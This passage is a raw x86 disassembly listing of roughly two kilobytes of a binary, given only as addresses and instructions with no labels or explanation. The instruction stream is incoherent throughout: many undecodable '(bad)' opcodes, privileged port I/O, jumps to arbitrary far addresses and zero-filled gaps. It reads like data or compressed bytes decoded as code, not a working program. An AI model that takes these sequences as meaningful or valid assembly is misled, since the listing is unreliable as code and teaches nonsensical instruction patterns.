  40daed:	sbb    eax,DWORD PTR [ecx-0x25]
  40daf0:	scas   eax,DWORD PTR es:[edi]
  40daf1:	push   cs
  40daf2:	push   eax
  40daf3:	hlt    
  40daf4:	xor    ebx,esi
  40daf6:	dec    edi
  40daf7:	in     al,dx
  40daf8:	dec    ecx
  40daf9:	sti    
  40dafa:	out    0xe9,eax
  40dafc:	enter  0xff0e,0xcb
  40db00:	adc    dh,BYTE PTR [edi-0x1]
  40db03:	aam    0xc3
  40db05:	ret    0x218c
  40db08:	xor    bh,BYTE PTR [ebp+eax*4+0xf]
  40db0c:	jmp    0x69fdda1f
  40db11:	repz (bad) 
  40db13:	out    dx,al
  40db14:	mov    dl,0xd
  40db16:	jmp    FWORD PTR [esi+esi*8+0x1e63664e]
  40db1d:	cli    
  40db1e:	mov    edi,0x979b4617
  40db23:	dec    ebx
  40db24:	pop    ebp
  40db25:	add    edi,edi
  40db27:	push   ss
  40db28:	add    eax,0x70d21bf5
  40db2d:	fimul  WORD PTR [esi]
  40db2f:	jl     0x40db83
  40db31:	popf   
  40db32:	or     eax,0x1c390874
	...
  40db43:	add    BYTE PTR [eax],al
  40db45:	add    BYTE PTR [edx+0x70],ch
  40db48:	(bad)  
  40db49:	push   cs
  40db4a:	adc    esi,DWORD PTR [ebp+0x1d6498bd]
  40db50:	dec    ecx
  40db51:	push   cs
  40db52:	push   esp
  40db53:	or     cl,al
  40db55:	push   ss
  40db56:	lock pop es
  40db58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db59:	sbb    dh,0x42
  40db5c:	lahf   
  40db5d:	push   cs
  40db5e:	cmp    al,0xb5
  40db60:	xchg   ebp,eax
  40db61:	pop    eax
  40db62:	test   DWORD PTR [esi],0x9a3b0e8e
  40db68:	or     eax,DWORD PTR [ebx+eiz*2]
  40db6b:	sub    BYTE PTR [ecx+0x75ece7fe],0xe
  40db72:	adc    al,0x8
  40db74:	xor    al,0x4f
  40db76:	or     eax,0x831b6608
  40db7b:	mov    ds:0x51fc03e8,al
  40db80:	xchg   ecx,eax
  40db81:	or     eax,0x464107f4
  40db86:	rol    BYTE PTR [edi],1
  40db88:	inc    esi
  40db89:	cmp    al,0x21
  40db8b:	stc    
  40db8c:	call   0x6859c549
  40db91:	inc    edi
  40db92:	adc    eax,DWORD PTR [edi]
  40db94:	cs push cs
  40db96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db97:	and    DWORD PTR [ecx+0xd],0x3e907c4
  40db9e:	arpl   WORD PTR ds:0xfc68c862,ax
  40dba4:	sub    BYTE PTR [edi+0x3c18567],dl
	...
  40dbb6:	add    BYTE PTR [eax],al
  40dbb8:	add    BYTE PTR [esi],ch
  40dbba:	add    dl,BYTE PTR [eax]
  40dbbc:	cld    
  40dbbd:	arpl   WORD PTR ds:0x7cf8e900,ax
  40dbc3:	sub    al,0xa8
  40dbc5:	pusha  
  40dbc6:	or     BYTE PTR [ebp-0xb],dh
  40dbc9:	push   0x6ede96d6
  40dbce:	jle    0x40db55
  40dbd0:	xchg   ecx,eax
  40dbd1:	gs or  bh,bh
  40dbd4:	inc    ecx
  40dbd5:	popf   
  40dbd6:	add    al,0x0
  40dbd8:	jmp    0xc0035dc2
  40dbdd:	outs   dx,BYTE PTR ds:[esi]
  40dbde:	push   es
  40dbdf:	push   eax
  40dbe0:	sar    DWORD PTR [eax-0x3351008e],0x80
  40dbe7:	ret    0x56a7
  40dbea:	push   es
  40dbeb:	push   eax
  40dbec:	sahf   
  40dbed:	xchg   esp,eax
  40dbee:	dec    ebp
  40dbef:	(bad)  
  40dbf0:	xchg   esi,eax
  40dbf1:	sbb    ax,0x5e5
  40dbf5:	addr16 add eax,0x7936c89
  40dbfb:	(bad)  
  40dbfc:	jle    0x40dc25
  40dbfe:	clc    
  40dbff:	sub    DWORD PTR [edi+0x5c00055f],0xffffff94
  40dc06:	inc    ebx
  40dc07:	(bad)  
  40dc08:	push   si
  40dc0a:	push   cs
  40dc0b:	add    bh,cl
  40dc0d:	pusha  
  40dc0e:	add    eax,0x76dce600
  40dc13:	add    cl,ch
  40dc15:	pusha  
  40dc16:	js     0x40dbad
  40dc18:	sub    edx,DWORD PTR [ebp+0x6]
  40dc1b:	jmp    FWORD PTR [eax+eax*1+0x0]
	...
  40dc2b:	add    BYTE PTR [ecx-0x233eb026],ah
  40dc31:	fld    DWORD PTR [eax-0x17]
  40dc34:	push   0x60e9644d
  40dc39:	cli    
  40dc3a:	mov    edi,0x751a6294
  40dc3f:	fs sub al,0x43
  40dc42:	dec    BYTE PTR [esi]
  40dc44:	pop    esi
  40dc45:	js     0x40dc89
  40dc47:	add    BYTE PTR [esi-0x517998ae],cl
  40dc4d:	inc    ebx
  40dc4e:	jmp    edi
  40dc50:	sub    al,0x5d
  40dc52:	(bad)  
  40dc53:	inc    DWORD PTR [ecx-0x4efd8b3e]
  40dc59:	pop    ebp
  40dc5a:	mov    WORD PTR [ebp-0x10738],ss
  40dc60:	inc    DWORD PTR [ebx+0x2b]
  40dc63:	mov    DWORD PTR [edi],eax
  40dc65:	scas   al,BYTE PTR es:[edi]
  40dc66:	std    
  40dc67:	call   FWORD PTR [ebp-0x74d76896]
  40dc6d:	add    edi,edi
  40dc6f:	jne    0x40dcaf
  40dc71:	jmp    0xb5fe:0xf8fd9698
  40dc78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc79:	clc    
  40dc7a:	(bad)  
  40dc7b:	(bad)  
  40dc7c:	jp     0x40dc67
  40dc7e:	loopne 0x40dc16
  40dc80:	int    0xf8
  40dc82:	mov    BYTE PTR [ebp-0x10776],al
  40dc88:	dec    edx
  40dc89:	imul   edx,DWORD PTR [esp+edi*1],0xb5ff014b
	...
  40dc9c:	add    BYTE PTR [eax],al
  40dc9e:	add    BYTE PTR [edx-0x8],bl
  40dca1:	(bad)  
  40dca2:	jmp    edx
  40dca4:	je     0x40dd0a
  40dca6:	add    dl,bh
  40dca8:	or     al,0xbf
  40dcaa:	je     0x40dca5
  40dcac:	imul   ebx,DWORD PTR [edx],0xff01cb3c
  40dcb2:	mov    ch,0xca
  40dcb4:	idiv   esi
  40dcb6:	call   FWORD PTR [ebp-0x5c17f891]
  40dcbc:	idiv   dh
  40dcbe:	jmp    DWORD PTR [edx]
  40dcc0:	mov    ebp,0x877dff91
  40dcc5:	test   dl,al
  40dcc7:	jl     0x40dcc2
  40dcc9:	(bad)  
  40dcca:	push   eax
  40dccb:	pop    ebp
  40dccc:	scas   eax,DWORD PTR es:[edi]
  40dccd:	mov    ebx,0xbef63fe
  40dcd2:	call   0x445d49
  40dcd7:	(bad)  
  40dcd9:	sti    
  40dcda:	test   BYTE PTR [esi],ah
  40dcdc:	pop    es
  40dcdd:	or     edi,edi
  40dcdf:	xchg   esp,eax
  40dce0:	enter  0xfe4e,0x8c
  40dce4:	push   ss
  40dce5:	sbb    ah,BYTE PTR [edi+edi*8]
  40dce8:	sbb    eax,DWORD PTR [ebx]
  40dcea:	push   DWORD PTR [esi+0x74ff0a63]
  40dcf0:	inc    ebx
  40dcf1:	jg     0x40dc85
  40dcf3:	ins    BYTE PTR es:[edi],dx
  40dcf4:	ss cmp eax,0xb01c5bc2
  40dcfa:	mov    cl,BYTE PTR [edi-0x3c]
  40dcfd:	nop
  40dcfe:	or     ecx,DWORD PTR [ebx-0x58]
  40dd01:	jno    0x40dd02
	...
  40dd0f:	add    BYTE PTR [eax],al
  40dd11:	add    BYTE PTR [eax+ebp*8+0x42],cl
  40dd15:	je     0x40dd6b
  40dd17:	ds mov ah,0xfe
  40dd1a:	mov    dh,0xf6
  40dd1c:	sbb    ch,BYTE PTR [ebx-0x17f563cb]
  40dd22:	mov    edx,0x1aff0b80
  40dd27:	mov    cl,0xfb
  40dd29:	push   DWORD PTR [edi+0x1f831877]
  40dd2f:	jnp    0x40dccf
  40dd31:	(bad)  
  40dd32:	jp     0x40dd01
  40dd34:	or     DWORD PTR [ebp+0x5b],esi
  40dd37:	push   esi
  40dd38:	jg     0x40dcc9
  40dd3a:	cld    
  40dd3b:	arpl   WORD PTR [ebp+0x45],di
  40dd3e:	test   eax,0xe676feec
  40dd44:	sbb    bh,BYTE PTR [edi+0x6a0b4be4]
  40dd4a:	add    BYTE PTR [ebx-0x6f],0x7
  40dd4e:	retf   
  40dd4f:	or     DWORD PTR [ebx],0xe6c8ccff
  40dd55:	dec    BYTE PTR [esi+0x5]
  40dd58:	icebp  
  40dd59:	sbb    ecx,DWORD PTR [eax]
  40dd5b:	add    eax,0x5490b1e
  40dd60:	or     eax,0x9be94668
  40dd66:	jg     0x40dda9
  40dd68:	test   al,0x3
  40dd6a:	pushf  
  40dd6b:	cmp    al,dh
  40dd6d:	fsub   QWORD PTR [ebx]
  40dd6f:	add    eax,0x4f7d701
  40dd74:	out    dx,al
  40dd75:	inc    BYTE PTR [eax]
	...
  40dd83:	add    BYTE PTR [eax],al
  40dd85:	les    edi,FWORD PTR [ecx-0x3]
  40dd88:	mov    bl,0x4
  40dd8a:	and    BYTE PTR ds:0xd65474c5,bl
  40dd90:	nop
  40dd91:	fs in  eax,dx
  40dd93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd94:	pop    es
  40dd95:	fs add al,0xd1
  40dd98:	push   es
  40dd99:	icebp  
  40dd9a:	add    edi,DWORD PTR [esi+0x246c549d]
  40dda0:	enter  0x5a3,0x41
  40dda4:	loope  0x40dd2e
  40dda6:	inc    esi
  40dda7:	jmp    0xd06d53b6
  40ddac:	les    esi,FWORD PTR [esp+ebp*8]
  40ddaf:	in     al,dx
  40ddb0:	jo     0x40ddde
  40ddb2:	add    al,0xe2
  40ddb4:	inc    ebx
  40ddb5:	scas   eax,DWORD PTR es:[edi]
  40ddb6:	sbb    DWORD PTR [ecx],ebx
  40ddb8:	pushf  
  40ddb9:	jns    0x40ddfc
  40ddbb:	sub    BYTE PTR [ebx+esi*4],al
  40ddbe:	add    al,0xfc
  40ddc0:	sti    
  40ddc1:	add    al,0x97
  40ddc3:	ins    BYTE PTR es:[edi],dx
  40ddc4:	or     al,BYTE PTR [ebp*8+0x3fc743c]
  40ddcb:	rol    DWORD PTR [ebx],cl
  40ddcd:	mov    DWORD PTR ds:0x4628aac1,eax
  40ddd3:	jmp    0xe944c273
  40ddd8:	or     ebx,0xffffffdd
  40dddb:	push   esp
  40dddc:	or     dl,ah
  40ddde:	verw   WORD PTR [ecx]
  40dde1:	fsub   QWORD PTR [edi]
  40dde3:	push   eax
  40dde4:	cdq    
  40dde5:	push   0x269b84
	...
  40ddf6:	add    BYTE PTR [eax],al
  40ddf8:	imul   edx,DWORD PTR [eax],0x53c495c0
  40ddfe:	push   0x44a4f2
  40de03:	mov    ecx,0x11087a59
  40de08:	(bad)  
  40de09:	(bad)  
  40de0a:	(bad)  
  40de0b:	(bad)  
  40de0c:	jns    0x40ddb1
  40de0e:	nop
  40de0f:	neg    BYTE PTR [edx-0x13]
  40de12:	cwde   
  40de13:	pop    eax
  40de14:	pop    ecx
  40de15:	add    al,0xff
  40de17:	pop    esp
  40de18:	imul   eax,DWORD PTR [esi*2-0x70eea70f],0xffffffd6
  40de20:	pop    edx
  40de21:	into   
  40de22:	shl    ebp,0x60
  40de25:	pop    edx
  40de26:	mov    edx,ebp
  40de28:	loopne 0x40ddf3
  40de2a:	jmp    0x40dde2
  40de2c:	push   0x2
  40de2e:	lea    ebp,[ebx+ebx*2]
  40de31:	push   ebp
  40de32:	push   DWORD PTR [edi+ecx*2]
  40de35:	add    al,0x75
  40de37:	cmc    
  40de38:	pop    eax
  40de39:	xlat   BYTE PTR ds:[ebx]
  40de3a:	(bad)  
  40de3b:	jmp    0xe700eca0
  40de40:	lods   eax,DWORD PTR ds:[esi]
  40de41:	into   
  40de42:	(bad)  
  40de43:	call   0x8185a8a8
  40de48:	addr16 add eax,0x48a3e900
  40de4e:	hlt    
  40de4f:	jbe    0x40deb3
  40de51:	add    eax,0x6f5f0300
  40de56:	add    bl,dl
  40de58:	pusha  
  40de59:	outs   dx,DWORD PTR ds:[esi]
  40de5a:	add    BYTE PTR [eax+eax*1+0x0],ch
	...
  40de6a:	add    BYTE PTR [esi+esi*8-0x6939bb1],dh
  40de71:	test   BYTE PTR [esi+0x5a],0x55
  40de75:	inc    DWORD PTR [eax]
  40de77:	pop    ds
  40de78:	ud0    esi,DWORD PTR [ebp-0x6a]
  40de7c:	and    DWORD PTR [ebx+eiz*2-0x3ff4f946],esp
  40de83:	push   cs
  40de84:	add    al,0xe8
  40de86:	mov    cs,edx
  40de88:	push   es
  40de89:	add    BYTE PTR [eax-0x1e],ch
  40de8c:	loope  0x40decd
  40de8e:	add    BYTE PTR [ebp-0x6e],dl
  40de91:	push   cs
  40de92:	call   0x405414
  40de97:	cli    
  40de98:	adc    eax,0xf714ff8d
  40de9e:	call   DWORD PTR [ebp+0x4de850b6]
  40dea4:	jne    0x40dea5
  40dea6:	push   ebx
  40dea8:	xor    al,0xf7
  40deab:	xchg   ebp,eax
  40deac:	or     eax,0xceb0de8
  40deb1:	jmp    FWORD PTR [edx+0x7a]
  40deb4:	sahf   
  40deb5:	mov    ds:0xff098b3c,eax
  40deba:	mov    ch,0x1a
  40debc:	adc    eax,0x9315ffff
  40dec1:	or     ch,al
  40dec3:	sub    dh,BYTE PTR [edx-0x1]
  40dec6:	push   DWORD PTR [ebx-0x2a08137d]
  40decc:	or     al,0x83
  40dece:	mov    ebp,0x0
	...
  40dedb:	add    BYTE PTR [eax],al
  40dedd:	add    dh,ah
  40dedf:	adc    al,0xff
  40dee1:	(bad)  
  40dee2:	cmp    dl,BYTE PTR [edx+0x60b6811]
  40dee8:	out    dx,eax
  40dee9:	mov    esi,0xf7ec5395
  40deee:	xchg   ebp,eax
  40deef:	or     eax,0x1e0275ff
  40def4:	xchg   edi,eax
  40def5:	mov    dl,0x85
  40def7:	or     eax,0x15a6b5ff
  40defc:	(bad)  
  40defd:	jmp    DWORD PTR [ebx+0x44]
  40df00:	cmp    al,0x90
  40df02:	in     al,0x52
  40df04:	or     BYTE PTR [ebp-0xf7bd2d],dh
  40df0a:	aam    0xb8
  40df0c:	idiv   dh
  40df0e:	push   esi
  40df0f:	in     al,0x1a
  40df11:	xor    ah,al
  40df13:	xor    cl,BYTE PTR [eax]
  40df15:	push   esi
  40df17:	sbb    edx,DWORD PTR [eax]
  40df19:	push   DWORD PTR [ebx+edx*1+0x1aac9058]
  40df20:	or     BYTE PTR [ebp-0x55],al
  40df23:	add    al,0xbf
  40df25:	(bad)  
  40df26:	pushf  
  40df27:	or     cl,BYTE PTR [eax]
  40df29:	jne    0x40dec2
  40df2b:	adc    ecx,DWORD PTR [edx]
  40df2d:	bound  esp,QWORD PTR [ebx-0x14]
  40df30:	cmp    edx,eax
  40df32:	push   edi
  40df33:	in     al,dx
  40df34:	lods   eax,DWORD PTR ds:[esi]
  40df35:	mov    cl,BYTE PTR [edi+0x6ce8406c]
  40df3b:	loop   0x40df43
  40df3d:	lea    esp,[esi]
  40df3f:	fdiv   DWORD PTR [ebx+0xfe]
	...
  40df51:	out    dx,al
  40df52:	sti    
  40df53:	add    eax,0x22d66f75
  40df58:	bound  esp,QWORD PTR [ebx-0x12]
  40df5b:	stc    
  40df5c:	mov    edi,0xe6715c
  40df61:	arpl   si,bp
  40df63:	cmp    eax,0x2ef3b45
  40df68:	add    BYTE PTR [ebx-0x59],ah
  40df6b:	shl    bl,0x2c
  40df6e:	lock add al,BYTE PTR [eax]
  40df71:	mov    ecx,0x8aff98ee
  40df76:	out    dx,al
  40df77:	cwde   
  40df78:	jmp    edi
  40df7a:	sub    DWORD PTR [eax],edx
  40df7c:	push   eax
  40df7d:	fidiv  WORD PTR [ecx+0x10]
  40df80:	test   DWORD PTR [eax+esi*2],0x576feb4
  40df87:	popa   
  40df88:	pop    es
  40df89:	outs   dx,BYTE PTR ds:[esi]
  40df8a:	add    DWORD PTR [ecx+0x51],edx
  40df8d:	add    DWORD PTR ds:0x79a4fae9,0x5c21ce4
  40df97:	jmp    0x10de2a9f
  40df9c:	(bad)
  40df9f:	mov    ebx,0x59ddbcf3
  40dfa4:	pop    es
  40dfa5:	mov    esp,0xe6347255
  40dfaa:	mov    dl,BYTE PTR [edi+ecx*1]
  40dfad:	lods   al,BYTE PTR ds:[esi]
  40dfae:	add    BYTE PTR [ecx+0x79cdbcb1],bh
  40dfb4:	pop    es
	...
  40dfc1:	add    BYTE PTR [eax],al
  40dfc3:	add    BYTE PTR [esi+ecx*4+0x8c146b],bl
  40dfca:	(bad)  
  40dfcb:	sbb    ebp,DWORD PTR [ebp-0x6b]
  40dfce:	cmc    
  40dfcf:	push   es
  40dfd0:	stc    
  40dfd1:	add    al,0x83
  40dfd3:	add    edi,DWORD PTR [edx+edi*4-0x28]
  40dfd7:	push   cs
  40dfd8:	je     0x40dfda
  40dfda:	ficom  WORD PTR [eax+0x730ced58]
  40dfe0:	add    BYTE PTR fs:[eax-0x80],ah
  40dfe4:	dec    edi
  40dfe5:	clc    
  40dfe6:	lds    eax,FWORD PTR [esi]
  40dfe8:	push   esp
  40dfe9:	mov    edx,0x4c0ecc
  40dfee:	sar    DWORD PTR [edi],0xea
  40dff1:	jmp    FWORD PTR [ebp+0xa78fcfa]
  40dff7:	mov    ah,0xeb
  40dff9:	mov    DWORD PTR [eax-0x69ffd3f2],edx
  40dfff:	push   eax
  40e000:	cmp    edi,eax
  40e002:	lea    eax,[esi]
  40e004:	or     eax,DWORD PTR [esi]
  40e006:	pop    esp
  40e007:	push   es
  40e008:	adc    al,0xc
  40e00a:	test   eax,0x6da48f
  40e00f:	jmp    0x40e071
  40e011:	lock mov ebp,0x41411e01
  40e017:	jmp    0x57289a79
  40e01c:	gs add bh,bh
  40e01f:	fsub   st(0),st
  40e021:	out    0x97,eax
  40e023:	xchg   ebp,eax
  40e024:	add    BYTE PTR gs:[eax-0x15],ch
	...
  40e034:	add    BYTE PTR [eax],al
  40e036:	add    BYTE PTR [eax-0x10],ah
  40e039:	mov    ebp,0x41409fd1
  40e03e:	jmp    0x37289aa0
  40e043:	gs add bh,bh
  40e046:	pushf  
  40e047:	mov    eax,0x65557fe7
  40e04c:	add    BYTE PTR [eax-0x17],ch
  40e04f:	pusha  
  40e050:	lock mov ebp,0x413beb81
  40e056:	jmp    0xf7289ab8
  40e05b:	data16 add bh,bh
  40e05e:	jl     0x40dfe8
  40e060:	out    0x67,eax
  40e062:	xor    eax,0x7de80065
  40e067:	out    dx,al
  40e068:	(bad)  
  40e069:	(bad)  
  40e06a:	ficomp WORD PTR [ecx+esi*8]
  40e06d:	not    dh
  40e06f:	pop    esi
  40e070:	in     eax,dx
  40e071:	mov    BYTE PTR [esi+0x66],bl
  40e074:	(bad)  
  40e075:	(bad)  
  40e076:	jl     0x40e0e7
  40e078:	idiv   dh
  40e07a:	mov    esi,0xb60c7866
  40e07f:	aam    0x6
  40e081:	call   0xff3f4612
  40e086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e088:	cmc    
  40e089:	neg    BYTE PTR [esi+0x666ced66]
  40e08f:	pop    esi
  40e090:	(bad)  
  40e091:	(bad)  
  40e092:	and    al,0x6f
  40e094:	in     al,dx
  40e095:	lock add ah,bl
  40e098:	or     bh,bh
  40e09a:	inc    DWORD PTR [eax]
	...
  40e0a8:	add    BYTE PTR [eax],al
  40e0aa:	pop    ss
  40e0ab:	pop    es
  40e0ac:	call   0x4a3c68
  40e0b1:	leave  
  40e0b2:	enter  0xfefd,0x54
  40e0b6:	jno    0x40e0d5
  40e0b8:	add    esp,0xffffff8e
  40e0bb:	fwait
  40e0bc:	(bad)  
  40e0bd:	imul   ebx,DWORD PTR [eax+0x8],0x88220875
  40e0c4:	mov    bh,bh
  40e0c6:	sbb    eax,0xb2fc457a
  40e0cb:	add    al,BYTE PTR [eax]
  40e0cd:	out    dx,eax
  40e0ce:	dec    esp
  40e0cf:	mov    eax,ds:0x30b3c7b
  40e0d4:	push   0xfec3be8d
  40e0d9:	(bad)  
  40e0da:	xlat   BYTE PTR ds:[ebx]
  40e0db:	cli    
  40e0dc:	out    0x47,al
  40e0de:	push   es
  40e0df:	or     bh,bh
  40e0e1:	push   0x3fcd17
  40e0e6:	pop    ebp
  40e0e7:	into   
  40e0e8:	and    eax,0xff02bb29
  40e0ed:	jne    0x40e071
  40e0ef:	sbb    dl,BYTE PTR [eax+0x68098dfd]
  40e0f5:	xchg   ebp,eax
  40e0f6:	ds ret 0x67fe
  40e0fa:	js     0x40e0fe
  40e0fc:	add    BYTE PTR [eax-0x17f97073],al
  40e102:	lods   al,BYTE PTR ds:[esi]
  40e103:	push   es
  40e104:	(bad)  
  40e105:	push   DWORD PTR [edx+0x3a413c5a]
  40e10b:	call   0x0:0x0
	...
  40e11a:	add    BYTE PTR [eax],al
  40e11c:	add    BYTE PTR [edx],bh
  40e11e:	cmp    dh,0x75
  40e121:	inc    edx
  40e122:	sbb    bl,BYTE PTR [ebx-0x2]
  40e125:	std    
  40e126:	or     BYTE PTR [eax-0x17],ch
  40e129:	push   cs
  40e12a:	ret    
  40e12b:	(bad)  
  40e12c:	addr16 arpl dx,bp
  40e12f:	add    al,BYTE PTR [eax]
  40e131:	jecxz  0x40e0c1
  40e133:	lea    eax,[edi]
  40e135:	or     esi,DWORD PTR ds:0x7f0cff06
  40e13b:	mov    ?,ebx
  40e13d:	add    al,0x1
  40e13f:	sti    
  40e140:	out    0x94,eax
  40e142:	pusha  
  40e143:	add    al,0xff
  40e145:	sub    ch,BYTE PTR [edx]
  40e147:	(bad)  
  40e148:	call   DWORD PTR [edi+0x6eff1773]
  40e14e:	call   0x4f30fa6d
  40e153:	add    al,0xb
  40e155:	mov    ds:0x4167c9bf,eax
  40e15a:	add    edx,eax
  40e15c:	call   DWORD PTR [esp+eax*2]
  40e15f:	push   ebp
  40e160:	xchg   edx,eax
  40e161:	mov    esp,0x4b4fb32e
  40e166:	in     al,dx
  40e167:	add    ch,bh
  40e169:	in     eax,dx
  40e16a:	xchg   ebx,eax
  40e16b:	mov    ebp,0xb2ec223c
  40e170:	(bad)  
  40e171:	push   ss
  40e172:	in     al,0x1a
  40e174:	jne    0x40e146
  40e176:	push   es
  40e177:	add    al,0x58
  40e179:	sti    
  40e17a:	in     al,dx
  40e17b:	add    ch,bh
  40e17d:	lds    eax,FWORD PTR [ebx+0x3cae]
	...
  40e18f:	add    BYTE PTR [edx],ah
  40e191:	in     al,dx
  40e192:	mov    dl,0xfe
  40e194:	out    dx,al
  40e195:	repz jmp 0xd6e8:0x2deb060
  40e19d:	gs add edi,edi
  40e1a0:	sub    dh,BYTE PTR [ecx+0x77ae000b]
  40e1a6:	lock and BYTE PTR [edi],0xbb
  40e1aa:	ins    DWORD PTR es:[edi],dx
  40e1ab:	add    BYTE PTR [ecx+0x6b75030f],bh
  40e1b1:	(bad)  
  40e1b2:	mov    dl,0x8a
  40e1b4:	xor    al,0x6
  40e1b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1b7:	lea    esp,[edi+0x241e12f9]
  40e1bd:	jae    0x40e1a0
  40e1bf:	jmp    0x40e1b8
  40e1c1:	cld    
  40e1c2:	lea    eax,[ebx]
  40e1c4:	mov    DWORD PTR [eax],ebp
  40e1c6:	xchg   BYTE PTR [ecx+0x5b],bh
  40e1c9:	in     eax,dx
  40e1ca:	jno    0x40e1cf
  40e1cc:	add    al,0xfd
  40e1ce:	add    ah,BYTE PTR [eax]
  40e1d0:	cld    
  40e1d1:	jb     0x40e1b4
  40e1d3:	jmp    0x40e1b8
  40e1d5:	cld    
  40e1d6:	gs add ebp,esp
  40e1d9:	jb     0x40e238
  40e1db:	add    ebp,DWORD PTR [esi+0xd]
  40e1de:	inc    ecx
  40e1df:	int    0xe9
  40e1e1:	cld    
  40e1e2:	dec    ebp
  40e1e3:	int    0xa2
  40e1e5:	add    ecx,ebp
  40e1e7:	pop    eax
  40e1e8:	fsubr  st,st(1)
  40e1ea:	cdq    
  40e1eb:	retf   0x195f
  40e1ee:	test   BYTE PTR [ebx+eiz*2+0x5],0xe9
  40e1f3:	add    eax,DWORD PTR [eax]
	...
  40e201:	add    BYTE PTR [eax],al
  40e203:	arpl   WORD PTR [eax],si
  40e205:	inc    edx
  40e206:	add    esi,DWORD PTR [esi]
  40e208:	or     eax,0x5043711
  40e20d:	jmp    0x6a4e19a0
  40e212:	cld    
  40e213:	bound  esi,QWORD PTR [ebx-0x28]
  40e216:	push   es
  40e217:	mov    bl,0x88
  40e219:	adc    al,BYTE PTR [esi]
  40e21b:	std    
  40e21c:	test   DWORD PTR [edx-0x1b8de0a1],esi
  40e222:	imul   ebx,DWORD PTR [edi+eax*1+0x726c0445],0x5c9eebed
  40e22d:	jmp    0xf47ad35
  40e232:	inc    ebp
  40e233:	arpl   WORD PTR [ebp+0x38],bp
  40e236:	inc    ecx
  40e237:	mov    ds:0xec99d105,al
  40e23c:	sti    
  40e23d:	push   DWORD PTR [ebp+0x4473c56d]
  40e243:	pusha  
  40e244:	jb     0x40e24e
  40e246:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e247:	dec    ebx
  40e248:	push   es
  40e249:	sub    BYTE PTR ds:[edi-0x78],bl
  40e24d:	ret    
  40e24e:	in     eax,dx
  40e24f:	ins    DWORD PTR es:[edi],dx
  40e250:	lds    esi,FWORD PTR [esp+esi*1+0x60]
  40e254:	adc    dl,BYTE PTR [ecx]
  40e256:	(bad)  
  40e257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e258:	add    eax,0x46a1dda3
  40e25d:	add    BYTE PTR [edx-0x5d],ch
  40e260:	sbb    DWORD PTR [edi],edi
  40e262:	sub    BYTE PTR [edi+0x5],bl
  40e265:	jne    0x40e258
	...
  40e273:	add    BYTE PTR [eax],al
  40e275:	add    BYTE PTR [ecx+0x12],ah
  40e278:	add    eax,0xeb059e1f
  40e27d:	adc    BYTE PTR [ebp+0x5],cl
  40e280:	push   0xffffffe8
  40e282:	popa   
  40e283:	xor    bl,BYTE PTR [esi+eax*1]
  40e286:	es add eax,0x3b6bd4ff
  40e28c:	inc    ecx
  40e28d:	jmp    0xe24caa77
  40e292:	mov    al,ds:0x6b262177
  40e297:	sbb    DWORD PTR [edi],edi
  40e299:	test   al,0x60
  40e29b:	cld    
  40e29c:	adc    al,0xf4
  40e29e:	and    al,BYTE PTR [esi+0x0]
  40e2a1:	push   0xffffff9c
  40e2a3:	pop    es
  40e2a4:	(bad)  
  40e2a5:	fcomp  QWORD PTR [ebx+0x3b]
  40e2a8:	inc    ecx
  40e2a9:	jmp    0xb65ce347
  40e2ae:	daa    
  40e2af:	add    eax,0x560e900
  40e2b4:	jmp    0x40e29e
  40e2b6:	daa    
  40e2b7:	nop
  40e2b8:	ret    0x9842
  40e2bb:	lds    eax,FWORD PTR [edi]
  40e2bd:	jmp    0xe5d1ca9
  40e2c2:	mov    al,ds:0x8e000005
  40e2c7:	and    al,0xff
  40e2c9:	xor    eax,0x414626
  40e2ce:	cmc    
  40e2cf:	adc    bl,BYTE PTR ds:0x83018b3e
  40e2d5:	les    edi,FWORD PTR [esi]
  40e2d7:	push   es
  40e2d8:	adc    eax,0x5
	...
  40e2e9:	add    al,0x48
  40e2eb:	add    bh,al
  40e2ed:	bndstx [edi],(bad)
  40e2f0:	inc    ecx
  40e2f1:	or     al,BYTE PTR [edi]
  40e2f3:	add    BYTE PTR [eax],al
  40e2f5:	cli    
  40e2f6:	rcl    DWORD PTR [ebx-0x75],0xd6
  40e2fa:	add    dl,0xf0
  40e2fd:	pop    ecx
  40e2fe:	mov    BYTE PTR [ebx+0x8],al
  40e301:	add    edi,eax
  40e303:	jb     0x40e310
  40e305:	jns    0x40e381
  40e307:	or     al,0x0
  40e309:	push   cs
  40e30a:	add    al,0x80
  40e30c:	cmp    dl,cl
  40e30e:	jae    0x40e317
  40e310:	sub    ecx,DWORD PTR [edx-0x2d3d36a8]
  40e316:	push   es
  40e317:	cmp    BYTE PTR [eax],0x4
  40e31a:	jae    0x40e32c
  40e31c:	xor    DWORD PTR [edi-0x35bec0e6],0x6
  40e323:	jne    0x40e32c
  40e325:	xchg   ecx,eax
  40e326:	(bad)  
  40e327:	pop    ecx
  40e328:	leave  
  40e329:	js     0x40e334
  40e32b:	add    BYTE PTR [eax+0x3e7484b2],al
  40e331:	add    DWORD PTR [edx+0xc],edx
  40e334:	dec    edx
  40e335:	stc    
  40e336:	loop   0x40e339
  40e338:	or     ebp,DWORD PTR [eax+0x72]
  40e33b:	push   es
  40e33c:	xor    edi,0x9
  40e33f:	add    DWORD PTR [ebp+0x7e],esi
  40e342:	sub    eax,eax
  40e344:	jmp    0x40e3a4
  40e346:	add    al,0x4d
  40e348:	or     al,0xf1
  40e34a:	inc    edx
  40e34b:	or     al,0x5
	...
  40e359:	add    BYTE PTR [eax],al
  40e35b:	add    BYTE PTR [ebx-0x14],ah
  40e35e:	push   es
  40e35f:	add    BYTE PTR [ebx-0x53],ah
  40e362:	loop   0x40e365
  40e364:	mov    bl,0xd4
  40e366:	sbb    al,0x8d
  40e368:	inc    esp
  40e369:	mov    ebx,0xe4968b52
  40e36e:	inc    esp
  40e36f:	push   eax
  40e370:	xor    al,0x31
  40e372:	adc    BYTE PTR [edx+0x3b],dl
  40e375:	mov    ecx,0x4424fe9a
  40e37a:	pop    ebp
  40e37b:	leave  
  40e37c:	and    esp,esp
  40e37e:	add    ch,BYTE PTR [ebx]
  40e380:	cmp    BYTE PTR [ebx-0x6f3f38b],cl
